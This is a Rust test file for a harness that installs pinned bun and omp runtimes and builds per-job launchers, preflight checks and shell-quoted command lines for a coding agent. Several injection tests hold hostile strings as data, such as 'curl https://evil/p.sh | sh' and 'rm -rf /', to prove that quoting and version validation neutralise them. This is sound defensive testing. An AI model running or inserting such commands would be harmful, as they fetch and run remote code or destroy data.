        assert!(s.contains(&format!("export XDG_DATA_HOME=\"{HARNESS_XDG_DATA_HOME}\"")));
        // The link lands in the directory the image's own PATH carries, which
        // is what makes a non-login shell find bun.
        assert!(s.contains(&format!("bin=\"{AGENT_BIN_DIR}\"")));
        assert!(s.contains(
            "ln -s \"$real\" \"$bin/bun.tmp.$$\" && mv -T \"$bin/bun.tmp.$$\" \"$bin/bun\""
        ));
        // …and only a provision does, after the release started.
        assert!(s.contains("if [ \"$smoke\" != 1 ] && [ \"$(readlink -f \"$bin/bun\""));
        // No installer piped to a shell: the pinned mise, checksum-verified.
        assert!(!s.contains("mise.run") && !s.contains("| sh"), "{s}");
        // An install the smoke test runs must write the lockfile it keeps:
        // bun writes none under `--production`.
        assert!(!s.contains("--production"), "{s}");
        assert!(s.contains(MISE_SHA256_X64) && s.contains(&format!("v{MISE_VERSION}")));
        // It answers bun, omp and the real bun's path, which is what callers
        // read back (parse_runtime).
        assert!(s.contains("echo \"bun $(\"$real\" --version </dev/null 9>&-)\""));
        assert!(s.contains("echo \"bunPath $real\""));
    }

    #[test]
    fn the_runtime_script_installs_the_pinned_omp_never_latest() {
        let s = harness_runtime_script(&RuntimeRun::provision(&Versions::bootstrap())).unwrap();
        assert!(!s.contains("@latest"), "{s}");
        assert!(!s.contains("npx"), "no per-run registry resolution: {s}");
        assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"{OMP_VERSION}\"")));
        assert!(s.contains(&omp_install_dir(OMP_VERSION)));
        assert!(
            !s.contains("|| true\n  fi\n  if ! started"),
            "the lock never falls through"
        );
        const { assert!(INSTALL_LOCK_WAIT_SECS * 1000 < 8 * 60_000) };
    }

    /// A stand-in bun: answers its own version, "installs" omp by writing a
    /// cli.js that answers omp's, and runs such a cli.js. Counts installs.
    #[cfg(unix)]
    fn fake_bun(dir: &std::path::Path) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let bun = dir.join("fake-bun");
        std::fs::write(
            &bun,
            format!(
                "#!/bin/sh\n\
                 if [ \"$1\" = --version ]; then echo {HARNESS_BUN}; exit 0; fi\n\
                 if [ \"$1\" = install ]; then echo x >> \"{count}\"; mkdir -p node_modules/{OMP_PACKAGE}/dist; echo 'omp' > node_modules/{OMP_PACKAGE}/dist/cli.js; echo lock > bun.lock; exit 0; fi\n\
                 if [ \"$2\" = --version ] && [ -f \"$1\" ]; then echo omp/{OMP_VERSION}; exit 0; fi\n\
                 exit 1\n",
                count = dir.join("installs").display()
            ),
        )
        .unwrap();
        std::fs::set_permissions(&bun, std::fs::Permissions::from_mode(0o755)).unwrap();
        bun
    }

    #[cfg(unix)]
    #[test]
    fn the_runtime_script_swaps_installs_in_and_never_deletes_one_in_place() {
        use std::process::Command;
        let tmp = std::env::temp_dir().join(format!("wbprov-runtime-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let bin = tmp.join("bin");
        let hroot = tmp.join("harness");
        std::fs::create_dir_all(&bin).unwrap();
        let bun = fake_bun(&tmp);
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
        let script = runtime_script_for(
            tmp.join("xdg").to_str().unwrap(),
            bin.to_str().unwrap(),
            hroot.to_str().unwrap(),
            &RuntimeRun::provision(&Versions::bootstrap()),
            &BOUNDS,
        );
        let run = || {
            let out = Command::new("sh").args(["-c", &script]).output().unwrap();
            assert!(
                out.status.success(),
                "{}",
                String::from_utf8_lossy(&out.stderr)
            );
            parse_runtime(&String::from_utf8_lossy(&out.stdout)).expect("three lines")
        };
        let first = run();
        assert_eq!(first.omp, format!("omp/{OMP_VERSION}"));
        let link = hroot.join("omp").join(OMP_VERSION);
        let installed = std::fs::read_link(&link).expect("the version path is a symlink");
        assert!(
            installed
                .file_name()
                .unwrap()
                .to_str()
                .unwrap()
                .starts_with(&format!(".{OMP_VERSION}."))
        );
        // A second run finds it started: no second install.
        run();
        assert_eq!(
            std::fs::read_to_string(tmp.join("installs"))
                .unwrap()
                .lines()
                .count(),
            1
        );
        // A broken install is replaced BESIDE the old one, which is kept for
        // whatever job is still running from it (pruned only when unused and
        // two days old).
        std::fs::remove_file(installed.join(format!("node_modules/{OMP_PACKAGE}/dist/cli.js")))
            .unwrap();
        run();
        let swapped = std::fs::read_link(&link).unwrap();
        assert_ne!(swapped, installed, "a new install, swapped in");
        assert!(
            installed.exists(),
            "the old install is not deleted under its jobs"
        );
        assert_eq!(
            std::fs::read_to_string(tmp.join("installs"))
                .unwrap()
                .lines()
                .count(),
            2
        );
        // The install was days old when it was swapped out (the review's
        // case: an OOM made `--version` fail, a reinstall swapped in). Its
        // own age says nothing about the job still running it: it is kept,
        // because it was RETIRED just now.
        let age = |path: &std::path::Path, ago: &str| {
            let ok = Command::new("touch")
                .args(["-d", ago])
                .arg(path)
                .status()
                .unwrap();
            assert!(ok.success());
        };
        age(&installed, "5 days ago");
        assert!(
            installed.join(".retired").exists(),
            "the swap stamps the old install retired"
        );
        run();
        assert!(
            installed.exists(),
            "an aged install retired a moment ago is kept"
        );
        // Retired more than two days ago, and unused: pruned. The current
        // one never is.
        age(&installed.join(".retired"), "3 days ago");
        run();
        assert!(
            !installed.exists(),
            "an install retired two days ago is pruned"
        );
        assert!(swapped.exists(), "the pinned install never is");
        // A not-current install the prune finds unstamped (left by a crash
        // mid-swap) is stamped, not removed: its clock starts there.
        let orphan = hroot.join("omp").join(format!(".{OMP_VERSION}.1.1"));
        std::fs::create_dir_all(&orphan).unwrap();
        age(&orphan, "9 days ago");
        run();
        assert!(orphan.exists() && orphan.join(".retired").exists());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn the_fallback_lock_is_taken_and_a_dead_or_pidless_one_reclaimed() {
        use std::process::Command;
        let tmp = std::env::temp_dir().join(format!("wbprov-lock-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        let bin = tmp.join("bin");
        let hroot = tmp.join("harness");
        std::fs::create_dir_all(&bin).unwrap();
        let bun = fake_bun(&tmp);
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
        // The script with flock hidden, so the directory lock is the one used.
        let script = runtime_script_for(
            tmp.join("xdg").to_str().unwrap(),
            bin.to_str().unwrap(),
            hroot.to_str().unwrap(),
            &RuntimeRun::provision(&Versions::bootstrap()),
            &BOUNDS,
        )
        .replace("command -v flock", "false");
        let lock = hroot.join("omp/.install.lock.d");
        let run = || Command::new("sh").args(["-c", &script]).output().unwrap();
        // A dead holder's lock: reclaimed, and the install goes ahead.
        std::fs::create_dir_all(&lock).unwrap();
        std::fs::write(lock.join("pid"), "999999999").unwrap();
        std::fs::write(lock.join("token"), "dead").unwrap();
        let out = run();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(!lock.exists(), "released on exit");
        // A pid-less lock (an older script killed between mkdir and pid)
        // is reclaimed once it is old enough.
        std::fs::remove_file(bun.with_file_name("installs")).ok();
        std::fs::remove_file(hroot.join(format!("omp/{OMP_VERSION}"))).unwrap();
        std::fs::create_dir_all(&lock).unwrap();
        let ok = Command::new("touch")
            .args(["-d", "10 minutes ago"])
            .arg(&lock)
            .status()
            .unwrap();
        assert!(ok.success());
        let out = run();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(!lock.exists());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn parse_runtime_reads_the_three_lines_and_refuses_a_partial_answer() {
        let out = "noise\nbun 1.4.4\nomp omp/18.16.0\nbunPath /opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun\n";
        assert_eq!(
            parse_runtime(out),
            Some(Runtime {
                bun: "1.4.4".into(),
                omp: "omp/18.16.0".into(),
                bun_path: "/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun".into(),
            })
        );
        assert_eq!(parse_runtime("bun 1.4.4\nomp omp/18.16.0\n"), None);
    }

    #[test]
    fn every_job_gets_its_own_harness_dir_and_launcher() {
        let a = job_harness_dir("11111111-1111-1111-1111-111111111111").unwrap();
        let b = job_harness_dir("22222222-2222-2222-2222-222222222222").unwrap();
        assert_ne!(a, b);
        let j = JOB;
        assert!(
            job_agent_dir(j)
                .unwrap()
                .starts_with(&job_harness_dir(j).unwrap())
        );
        assert!(
            job_launcher(j)
                .unwrap()
                .starts_with(&job_harness_dir(j).unwrap())
        );
        assert_ne!(
            job_agent_dir(j).unwrap(),
            PI_CODING_AGENT_DIR,
            "never the shared dir every job used to fight over"
        );
        assert!(job_harness_dir(DOCTOR_SLOT).is_some());
    }

    #[test]
    fn a_slot_is_a_job_uuid_or_doctor_and_nothing_else() {
        for bad in [
            "",
            "..",
            "../x",
            "abc",
            "x/y",
            "11111111-1111-1111-1111-11111111111",
            "11111111-1111-1111-1111-1111111111111",
            "11111111_1111-1111-1111-111111111111",
            "AAAAAAAA-1111-1111-1111-111111111111",
            "doctor/..",
        ] {
            assert!(job_harness_dir(bad).is_none(), "{bad:?}");
            assert!(job_launcher(bad).is_none() && job_agent_dir(bad).is_none());
            assert!(launcher_script(bad, "/w", &rt("/b"), true).is_none());
        }
    }

    #[test]
    fn the_launcher_runs_omp_on_the_harness_bun_in_the_jobs_own_dir() {
        let l = launcher_script(
            JOB,
            "/opt/data/workbench/jobs/abc",
            &rt("/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun"),
            true,
        )
        .unwrap();
        assert!(l.starts_with("#!/bin/sh\n"), "{l}");
        assert!(l.contains(&format!(
            "export PI_CODING_AGENT_DIR={}\n",
            job_agent_dir(JOB).unwrap()
        )));
        // omp is exec'd on the harness's bun by path: a repo's pinned bun on
        // PATH can no longer be the one omp checks its floor against.
        assert!(l.contains(&format!(
            "exec /opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun {} \"$@\"",
            omp_entry(OMP_VERSION)
        )));
        assert!(!l.contains("env bun") && !l.contains("@latest"));
        // The repo's toolchain is on PATH for omp's own commands, absolute.
        assert!(l.contains("PATH=\"$MISE_DATA_DIR/shims:$PATH\""));
        // It stands in the workdir and loads the project env.
        assert!(l.contains("cd /opt/data/workbench/jobs/abc ||"));
        assert!(l.contains(". ./.talaria/env"));
        // On the gateway, a shell without the key is refused in one sentence.
        assert!(l.contains(&format!("${{{WORKBENCH_KEY_ENV}:-}}")));
        assert!(l.contains(&format!("exit {LAUNCHER_REFUSED}")));
        // The key's NAME only, never a value, and never the personas' key.
        assert!(!l.contains("LLM_API_KEY") && !l.contains("OPENAI_API_KEY"));
        let account = launcher_script(JOB, "/w", &rt("/b"), false).unwrap();
        assert!(
            !account.contains(WORKBENCH_KEY_ENV),
            "a coding account's job needs no gateway key: {account}"
        );
    }

    #[test]
    fn a_hostile_path_cannot_break_out_of_the_launcher() {
        let l = launcher_script(JOB, "/w; curl evil | sh", &rt("/b"), false).unwrap();
        assert!(l.contains("cd '/w; curl evil | sh' ||"), "{l}");
    }

    #[test]
    fn the_job_harness_dir_links_the_render_and_holds_no_key() {
        let s = job_harness_script();
        assert!(!s.contains("__"), "{s}");
        for (from, to) in [
            ("models.yml", "models.yml"),
            ("mcp.json", "mcp.json"),
            ("pi-settings.json", "settings.json"),
        ] {
            assert!(
                s.contains(&format!("ln -sfn \"$cfg/{from}\" \"$agent/{to}\"")),
                "{from}: {s}"
            );
        }
        assert!(s.contains(&format!("cfg=\"{WORKBENCH_CONFIG_DIR}\"")));
        assert!(!s.contains("KEY"), "no key is written anywhere: {s}");
    }

    #[test]
    fn the_preflight_checks_what_the_live_fleet_tripped_on_without_a_model_call() {
        let s = preflight_script("/b/bun", OMP_VERSION);
        assert!(!s.contains("__"), "{s}");
        for check in [
            "launcher", "key", "version", "writable", "models", "gateway",
        ] {
            assert!(s.contains(&format!("fail {check} ")), "{check} missing");
        }
        assert!(s.contains(&format!("*\"omp/{OMP_VERSION}\"*")));
        // The gateway check is the model LIST, which spends nothing.
        assert!(s.contains("\"/models\""));
        assert!(!s.contains("chat/completions") && !s.contains(" -p "));
    }

    #[cfg(unix)]
    fn script(path: &std::path::Path, body: &str) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(path, format!("#!/bin/sh\n{body}\n")).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(unix)]
    fn scratch(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("wbprov-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[cfg(unix)]
    #[test]
    fn the_launcher_stands_in_the_workdir_on_the_jobs_dir_and_refuses_without_the_key() {
        use std::process::Command;
        let tmp = scratch("launcher");
        let work = tmp.join("work");
        std::fs::create_dir_all(work.join(".talaria")).unwrap();
        std::fs::write(work.join(".talaria/env"), "PROJECT_FLAG=on\n").unwrap();
        let entry = tmp.join("cli.js");
        std::fs::write(&entry, "").unwrap();
        let bun = tmp.join("bun");
        script(
            &bun,
            "echo \"dir=$PI_CODING_AGENT_DIR pwd=$(pwd) flag=$PROJECT_FLAG entry=$1 args=$2 $3\"",
        );
        let launcher = tmp.join("omp");
        let text = launcher_script_with(
            JOB,
            work.to_str().unwrap(),
            bun.to_str().unwrap(),
            true,
            entry.to_str().unwrap(),
            &Versions::bootstrap(),
        )
        .unwrap();
        script(&launcher, text.trim_start_matches("#!/bin/sh\n"));
        let out = Command::new(&launcher)
            .args(["--mode", "json"])
            .env(WORKBENCH_KEY_ENV, "k")
            .current_dir(&tmp)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let said = String::from_utf8_lossy(&out.stdout);
        assert!(
            said.contains(&format!("dir={}", job_agent_dir(JOB).unwrap())),
            "{said}"
        );
        assert!(said.contains(&format!("pwd={}", work.display())), "{said}");
        assert!(
            said.contains("flag=on"),
            "the project env is loaded: {said}"
        );
        assert!(
            said.contains(&format!("entry={}", entry.display()))
                && said.contains("args=--mode json"),
            "{said}"
        );
        // No key in the shell: refused before omp starts, in one sentence.
        let refused = Command::new(&launcher)
            .env_remove(WORKBENCH_KEY_ENV)
            .output()
            .unwrap();
        assert_eq!(refused.status.code(), Some(LAUNCHER_REFUSED));
        assert!(String::from_utf8_lossy(&refused.stderr).contains(WORKBENCH_KEY_ENV));
        // omp pruned from under it: refused with what to do.
        std::fs::remove_file(&entry).unwrap();
        let gone = Command::new(&launcher)
            .env(WORKBENCH_KEY_ENV, "k")
            .output()
            .unwrap();
        assert_eq!(gone.status.code(), Some(LAUNCHER_REFUSED));
        assert!(String::from_utf8_lossy(&gone.stderr).contains("call prepare_env"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn the_harness_dir_is_laid_out_only_while_the_job_still_has_a_checkout() {
        use std::io::Write;
        use std::process::{Command, Stdio};
        let tmp = scratch("layout");
        let dir = tmp.join("jobs").join(JOB);
        let sessions = tmp.join("sessions");
        let run = |must: &std::path::Path| {
            let mut child = Command::new("sh")
                .args(["-c", &job_harness_script(), "sh"])
                .arg(&dir)
                .arg(&sessions)
                .arg(must)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap();
            child
                .stdin
                .take()
                .unwrap()
                .write_all(b"#!/bin/sh\necho launcher\n")
                .unwrap();
            child.wait_with_output().unwrap()
        };
        // Torn down: nothing is re-created.
        let ended = run(&tmp.join("work/.git"));
        assert_eq!(ended.status.code(), Some(3));
        assert!(!dir.exists(), "no harness dir for an ended job");
        // Live: the agent dir links the render, the launcher is in place.
        std::fs::create_dir_all(tmp.join("work/.git")).unwrap();
        let out = run(&tmp.join("work/.git"));
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(
            std::fs::read_link(dir.join("agent/models.yml")).unwrap(),
            std::path::Path::new(WORKBENCH_CONFIG_DIR).join("models.yml")
        );
        assert_eq!(
            std::fs::read_to_string(dir.join("omp")).unwrap(),
            "#!/bin/sh\necho launcher\n"
        );
        assert!(sessions.is_dir());
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn the_preflight_fails_each_way_the_live_fleet_did_and_passes_a_good_harness() {
        use std::process::Command;
        let tmp = scratch("preflight");
        let agent = tmp.join("agent");
        std::fs::create_dir_all(&agent).unwrap();
        std::fs::write(
            agent.join("models.yml"),
            "providers:\n  talaria:\n    baseUrl: http://gw/api/llm/v1\n    models:\n      - id: zai-outcrop/glm-5.3\n      - id: \"other\"\n",
        )
        .unwrap();
        let good = tmp.join("omp-good");
        script(&good, &format!("echo omp/{OMP_VERSION}"));
        let old_bun = tmp.join("omp-oldbun");
        script(
            &old_bun,
            "echo 'error: Bun runtime must be >= 1.4.4 (found v1.4.0)'; exit 1",
        );
        let gw200 = tmp.join("bun200");
        script(&gw200, "echo 200");
        let gw401 = tmp.join("bun401");
        script(&gw401, "echo 401");
        let run = |launcher: &std::path::Path, model: &str, bun: &std::path::Path, key: bool| {
            let mut cmd = Command::new("bash");
            cmd.args([
                "-c",
                &preflight_script(bun.to_str().unwrap(), OMP_VERSION),
                "bash",
            ])
            .arg(launcher)
            .arg(&agent)
            .arg(model)
            .arg("SOME_STRIPPED_NAME");
            if key {
                cmd.env(WORKBENCH_KEY_ENV, "k");
            } else {
                cmd.env_remove(WORKBENCH_KEY_ENV);
            }
            preflight_verdict(&String::from_utf8_lossy(&cmd.output().unwrap().stdout))
        };
        let m = "zai-outcrop/glm-5.3";
        assert_eq!(
            run(&good, m, &gw200, true),
            Ok(format!("omp/{OMP_VERSION}"))
        );
        assert_eq!(run(&good, m, &gw200, false).unwrap_err().0, "key");
        assert_eq!(run(&old_bun, m, &gw200, true).unwrap_err().0, "version");
        let (check, detail) = run(&good, "zai-outcrop/glm-5", &gw200, true).unwrap_err();
        assert_eq!(
            check, "models",
            "a prefix of a listed id is not that id: {detail}"
        );
        assert_eq!(
            run(&good, "other", &gw200, true),
            Ok(format!("omp/{OMP_VERSION}")),
            "a quoted id matches"
        );
        let (check, detail) = run(&good, m, &gw401, true).unwrap_err();
        assert_eq!(check, "gateway");
        assert!(detail.contains("401"), "{detail}");
        assert_eq!(
            run(&tmp.join("missing"), m, &gw200, true).unwrap_err().0,
            "launcher"
        );
        // A coding account's job: no gateway checks, no key needed.
        assert_eq!(
            run(&good, "", &gw401, false),
            Ok(format!("omp/{OMP_VERSION}"))
        );
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn preflight_verdict_reads_ok_and_fail() {
        assert_eq!(
            preflight_verdict("junk\nOK omp/18.16.0\n"),
            Ok("omp/18.16.0".into())
        );
        assert_eq!(
            preflight_verdict(
                "FAIL version\nthe launcher exited 1: error: Bun runtime must be >= 1.4.4\n"
            ),
            Err((
                "version".into(),
                "the launcher exited 1: error: Bun runtime must be >= 1.4.4".into()
            ))
        );
        assert_eq!(
            preflight_verdict(""),
            Err(("preflight".into(), "the preflight printed nothing".into()))
        );
    }

    #[test]
    fn a_container_without_the_shape_env_is_stale_and_the_current_one_is_not() {
        assert_eq!(sandbox_stale_reason(SANDBOX_SHAPE), None);
        assert_eq!(sandbox_stale_reason(&format!(" {SANDBOX_SHAPE}\n")), None);
        let why = sandbox_stale_reason("").expect("no token is stale");
        assert!(why.contains("predates"), "{why}");
        assert!(sandbox_stale_reason("2026-10-22.models-yml+workbench-key").is_some());
        assert_eq!(
            shape_env().get(SANDBOX_SHAPE_ENV).and_then(Value::as_str),
            Some(SANDBOX_SHAPE)
        );
    }

    #[test]
    fn omp_env_carries_the_workbench_key_only_and_its_config_dir() {
        let env = omp_env();
        assert_eq!(
            env.get(WORKBENCH_KEY_ENV).and_then(Value::as_str),
            Some("${LLM_WORKBENCH_API_KEY}")
        );
        assert!(
            !env.values()
                .any(|v| v.as_str().is_some_and(|s| s.contains("LLM_API_KEY"))),
            "the personas' key never reaches the sandbox env"
        );
        assert_eq!(
            env.get("PI_CODING_AGENT_DIR").and_then(Value::as_str),
            Some(PI_CODING_AGENT_DIR)
        );
        assert_eq!(
            env.len(),
            2,
            "nothing else rides the container env: {env:?}"
        );
    }

    #[test]
    fn the_workbench_key_rides_a_name_hermes_does_not_strip() {
        // Hermes strips its provider names from every terminal child, and
        // env_passthrough cannot re-allow them. The key used to be one.
        for gone in ["OPENAI_API_KEY", "OPENAI_BASE_URL"] {
            assert!(
                !omp_env().contains_key(gone),
                "{gone} never reaches a command the agent runs"
            );
        }
        assert!(WORKBENCH_KEY_ENV.starts_with("TALARIA_"));
        // omp looks the apiKey up as an env var NAME; a `$` makes it a literal.
        assert!(
            WORKBENCH_KEY_ENV
                .bytes()
                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_'),
            "a bare env-var name: {WORKBENCH_KEY_ENV}"
        );
    }

    #[test]
    fn the_auth_probe_makes_one_bare_model_call() {
        let line = fill_cmd(OMP.auth_probe, Some("qwen3:14b"), "/unused", "/l/omp");
        assert!(line.contains("--model talaria/qwen3:14b"), "{line}");
        assert!(line.contains(" -p "), "print mode, not the TUI: {line}");
        for flag in [
            "--no-session",
            "--no-tools",
            "--no-skills",
            "--no-rules",
            "--no-extensions",
        ] {
            assert!(line.contains(flag), "{flag} missing: {line}");
        }
        assert!(!line.contains("<model>"));
        assert!(
            !line.contains("--auto-approve"),
            "no tools load, so nothing needs approving"
        );
    }

    #[test]
    fn fill_cmd_slots_the_prefixed_model_and_session_dir_and_leaves_task() {
        let out = fill_cmd(
            OMP.json_invoke,
            Some("qwen3:14b"),
            "/opt/data/workbench/sessions/abc",
            &job_launcher(JOB).unwrap(),
        );
        assert_eq!(
            out,
            "/opt/data/workbench/harness/jobs/11111111-2222-4333-8444-555555555555/omp --mode json --auto-approve --session-dir /opt/data/workbench/sessions/abc --model talaria/qwen3:14b \"<task>\""
        );
        assert!(
            out.contains("\"<task>\""),
            "the steer stays for the driving agent to fill"
        );
    }

    #[test]
    fn every_invocation_line_takes_a_session_dir_and_a_model() {
        for t in [
            OMP.invoke,
            OMP.json_invoke,
            OMP.continue_invoke,
            OMP.continue_json_invoke,
        ] {
            assert!(t.contains("<sessionDir>"), "{t}");
            assert!(t.contains("<model>"), "{t}");
            assert!(
                t.starts_with("<launcher> "),
                "the job's launcher, never npx: {t}"
            );
        }
        assert!(OMP.continue_invoke.contains(" -c "));
        assert!(OMP.continue_json_invoke.contains(" -c "));
    }

    #[test]
    fn an_already_qualified_model_arg_is_not_prefixed_again() {
        let out = fill_cmd_arg(
            OMP.json_invoke,
            Some("anthropic/claude-opus-4-5"),
            "/opt/data/workbench/sessions/abc",
            "/l/omp",
        );
        assert!(
            out.contains("--model anthropic/claude-opus-4-5"),
            "a coding account's model keeps its own provider: {out}"
        );
        assert!(
            !out.contains("talaria/anthropic"),
            "and gains no second prefix"
        );
    }

    #[test]
    fn the_role_env_prefix_covers_the_three_roles_that_ride_env() {
        let prefix = role_env_prefix(&[
            ("default".into(), "anthropic/opus".into()),
            ("smol".into(), "anthropic/haiku".into()),
            ("slow".into(), "anthropic/sonnet".into()),
            ("plan".into(), "anthropic/opus".into()),
        ]);
        assert!(prefix.contains("PI_SMOL_MODEL=anthropic/haiku "));
        assert!(prefix.contains("PI_SLOW_MODEL=anthropic/sonnet "));
        assert!(prefix.contains("PI_PLAN_MODEL=anthropic/opus "));
        assert!(
            !prefix.contains("PI_MODEL"),
            "the default rides --model, not the env"
        );
    }

    #[test]
    fn a_value_with_shell_metacharacters_is_one_quoted_word() {
        // The injection the grammar and the quoting both exist for.
        let hostile = "x; curl https://evil/p.sh | sh; #";
        assert_eq!(sh_quote(hostile), "'x; curl https://evil/p.sh | sh; #'");
        // A single quote inside closes, escapes, and reopens.
        assert_eq!(sh_quote("it's"), "'it'\\''s'");
        // The empty string is still one word.
        assert_eq!(sh_quote(""), "''");
        // $(...), backticks, spaces, newlines: all quoted.
        for v in ["$(id)", "`id`", "a b", "a\nb", "a\"b", "a&b", "a>b"] {
            let q = sh_quote(v);
            assert!(q.starts_with('\'') && q.ends_with('\''), "{v:?} -> {q}");
        }
        // The real vocabulary passes through bare, so the usual line is
        // byte-for-byte what it was.
        for v in [
            "talaria/qwen3:14b",
            "anthropic/claude-opus-4-5",
            "/opt/data/workbench/sessions/abc",
            "gpt-5.1",
        ] {
            assert_eq!(sh_quote(v), v);
        }
    }

    #[test]
    fn a_hostile_model_arg_cannot_break_out_of_the_line() {
        let hostile = "talaria/x; curl https://evil/p.sh | sh; #";
        let out = fill_cmd_arg(
            OMP.json_invoke,
            Some(hostile),
            "/opt/data/workbench/sessions/abc",
            "/l/omp",
        );
        assert!(
            out.contains("--model 'talaria/x; curl https://evil/p.sh | sh; #' \"<task>\""),
            "{out}"
        );
        let prefix = role_env_prefix(&[("smol".into(), hostile.into())]);
        assert_eq!(
            prefix,
            "PI_SMOL_MODEL='talaria/x; curl https://evil/p.sh | sh; #' "
        );
    }

    #[test]
    fn roles_become_omp_env_with_the_provider_prefix_and_skip_unresolved() {
        let roles = OmpRoles {
            default: Some("mid".into()),
            smol: Some("fast".into()),
            slow: None,
            plan: Some("deep".into()),
        };
        let env = roles.env();
        assert_eq!(env["PI_SMOL_MODEL"], json!("talaria/fast"));
        assert_eq!(env["PI_PLAN_MODEL"], json!("talaria/deep"));
        assert!(
            !env.contains_key("PI_SLOW_MODEL"),
            "an unresolved role is left for omp's default"
        );
        assert!(
            !env.contains_key("PI_MODEL"),
            "the default rides --model, not the env"
        );
    }

    #[test]
    fn model_ids_are_distinct_with_the_default_first() {
        let roles = OmpRoles {
            default: Some("mid".into()),
            smol: Some("fast".into()),
            slow: Some("deep".into()),
            plan: Some("deep".into()),
        };
        assert_eq!(roles.model_ids(), vec!["mid", "fast", "deep"]);
        assert!(OmpRoles::default().model_ids().is_empty());
    }

    #[test]
    fn a_job_runs_what_the_channel_verified_else_the_bootstrap_never_a_range() {
        let boot = effective_from(None);
        assert_eq!(boot.target, Versions::bootstrap());
        assert_eq!((boot.source, boot.fallback), ("bootstrap", None));
        let st = json!({
            "current": { "bun": "1.4.5", "omp": "18.17.0" },
            "previous": { "bun": "1.4.4", "omp": "18.16.0" },
        });
        let e = effective_from(Some(&st));
        assert_eq!(e.source, "verified");
        assert_eq!(
            e.target,
            Versions {
                bun: "1.4.5".into(),
                omp: "18.17.0".into()
            }
        );
        assert_eq!(e.fallback, Some(Versions::bootstrap()));
        // Whatever is stored, only a plain x.y.z ever reaches a script.
        for hostile in ["latest", ">=1.4.4", "1.4", "1.4.4; rm -rf /", "01.4.4", ""] {
            let st = json!({ "current": { "bun": hostile, "omp": "18.17.0" } });
            assert_eq!(
                effective_from(Some(&st)).target,
                Versions::bootstrap(),
                "{hostile:?}"
            );
            let v = Versions {
                bun: hostile.into(),
                omp: "18.17.0".into(),
            };
            assert!(
                harness_runtime_script(&RuntimeRun::provision(&v)).is_none(),
                "{hostile:?}"
            );
        }
        assert!(plain_version("0.22.10") && plain_version("1.4.4"));
        // An unreadable row is the bootstrap too, never an error that stops a job.
        assert_eq!(
            effective_from(Some(&json!("garbage"))).target,
            Versions::bootstrap()
        );
    }

    #[test]
    fn the_runtime_script_installs_the_versions_it_is_given() {
        let v = Versions {
            bun: "1.4.5".into(),
            omp: "18.17.0".into(),
        };
        let s = harness_runtime_script(&RuntimeRun::provision(&v)).unwrap();
        assert!(s.contains("bun@1.4.5") && !s.contains(&format!("bun@{HARNESS_BUN}")));
        assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"18.17.0\"")));
        assert!(s.contains(&omp_install_dir("18.17.0")));
        assert!(!s.contains("@latest") && !s.contains("__"), "{s}");
    }

    /// A stand-in bun that knows versions: an install writes the version the
    /// package.json asks for into cli.js, and cli.js answers it.
    #[cfg(unix)]
    fn versioned_bun(dir: &std::path::Path, bun_version: &str) -> std::path::PathBuf {
        let bun = dir.join("vbun");
        script(
            &bun,
            &format!(
                "if [ \"$1\" = --version ]; then echo {bun_version}; exit 0; fi\n\
                 if [ \"$1\" = install ]; then v=$(sed -n 's|.*\"{OMP_PACKAGE}\":\"\\([0-9.]*\\)\".*|\\1|p' package.json); mkdir -p node_modules/{OMP_PACKAGE}/dist; echo \"$v\" > node_modules/{OMP_PACKAGE}/dist/cli.js; echo lock > bun.lock; exit 0; fi\n\
                 if [ \"$2\" = --version ] && [ -f \"$1\" ]; then echo \"omp/$(cat \"$1\")\"; exit 0; fi\n\
                 exit 1"
            ),
        );
        bun
    }

    #[cfg(unix)]
    #[test]
    fn a_running_job_keeps_the_release_it_started_on_until_it_ends() {
        use std::process::Command;
        let tmp = scratch("upgrade");
        let bin = tmp.join("bin");
        let hroot = tmp.join("harness");
        let work = tmp.join("work");
        std::fs::create_dir_all(&bin).unwrap();
        std::fs::create_dir_all(&work).unwrap();
        let bun = versioned_bun(&tmp, HARNESS_BUN);
        place_bun(&tmp.join("xdg"), HARNESS_BUN, &bun);
        let old = Versions {
            bun: HARNESS_BUN.into(),
            omp: "18.15.0".into(),
        };
        let new = Versions {
            bun: HARNESS_BUN.into(),
            omp: "18.16.0".into(),
        };
        let run = |v: &Versions| {
            let script = runtime_script_for(
                tmp.join("xdg").to_str().unwrap(),
                bin.to_str().unwrap(),
                hroot.to_str().unwrap(),
                &RuntimeRun::provision(v),
                &BOUNDS,
            );
            let out = Command::new("sh").args(["-c", &script]).output().unwrap();
            assert!(
                out.status.success(),
                "{}",
                String::from_utf8_lossy(&out.stderr)
            );
            parse_runtime(&String::from_utf8_lossy(&out.stdout)).expect("three lines")
        };
